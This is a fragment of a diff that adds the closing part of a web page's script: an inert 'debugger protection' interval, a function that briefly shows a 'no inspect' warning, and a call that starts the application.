+            // Debugger protection
+            function debuggerProtection() {
+                setInterval(() => {
+                    if (devtoolsOpen) return;
+                    try {
+                        (function() {
+                            return false;
+                        })();
+                    } catch (e) {}
+                }, 1000);
+            }
+            debuggerProtection();
+        }
+
+        // Show inspect warning
+        function showInspectWarning() {
+            noInspect.style.display = 'block';
+            setTimeout(() => {
+                noInspect.style.display = 'none';
+            }, 3000);
+        }
+
+        // Start the application
+        init();
+    </script>
+</body>
+</html>
